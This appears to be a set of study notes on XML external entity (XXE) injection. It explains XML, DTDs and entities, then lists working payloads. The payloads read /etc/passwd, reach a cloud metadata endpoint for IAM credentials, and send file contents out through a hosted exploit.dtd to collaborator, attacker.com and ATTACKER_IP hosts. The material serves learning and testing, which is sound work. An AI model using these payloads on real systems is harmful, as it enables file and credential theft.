---
title: XML External Entity
description: XML external entity injection
sidebar:
  order: 2
---

## What is XML

- Extensible Markup Language
- Used by application to store and transport data, web services, APIs
- It's human-readable and machine parseable

## XML Syntax and Structure

```xml
<?xml version="1.0" encoding="UTF-8"?>
<user id="1">
   <name>John</name>
   <age>30</age>
   <address>
      <street>123 Main St</street>
      <city>Anytown</city>
   </address>
</user>
```

- **Element** is a tag
- **Attributes** additional information for the tag

## XSLT

- Extensible Stylesheet Language Transformations
- Use for data transformation and formatting

### XSLT for XXE attack

- **Data Extraction** : extract sensitive data
- **Entity Expansion**: allows can expand entity which means attacker can inject malicious entities.
- **Data Manipulation**: modifying data in a XML document
- **Blind XXE**: attack can inject malicious entities without seeing the server response.

## DTD

- Document Type Definitions
- Define structure and constraints of an XML document
- Purpose of DTD
  - **Validation**: ensure XML follow the structure of specific criteria
  - **Entity Declaration**: define entities that can be used in the XML document

## XML Entities

- Entities are placeholder for data or code in XML document

### Types of Entities

#### Internal Entities

#### External Entities

#### Parameter Entities

#### General Entities

## XML Parsing Mechanisms

### Common XML Parsers

#### DOM Parser

#### SAX Parser

#### StAX Parser

#### XPath Parser

## Exploit
### Read file
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&xxe;</productId><storeId>
</storeId></stockCheck>
```

### SSRF
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
<stockCheck><productId>&xxe;</productId><storeId>
</storeId></stockCheck>
```

### Out-of-band 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://gau2yglkb5cd6y4jqxekmb9v1m7ev4jt.oastify.com"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### XML parameters
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://gau2yglkb5cd6y4jqxekmb9v1m7ev4jt.oastify.com">]>
<stockCheck><productId>%xxe; </productId><storeId>1</storeId></stockCheck>
```

### Exfiltrate with out-of-band
**exploit.dtd**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname"> 
<!ENTITY % oobxxe "<!ENTITY &#x25; exfil SYSTEM 'http://iyk4mi9mz70fu0slez2madxxpovgjf74.oastify.com/?x=%file;'>"> 
%oobxxe; 
%exfil;
```

**Parameter Entity**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"https://attacker.com/exploit.dtd"> %xxe; ]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

**General Entity**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/sample.dtd">
<upload>
    <file>&exfil;</file>
</upload>
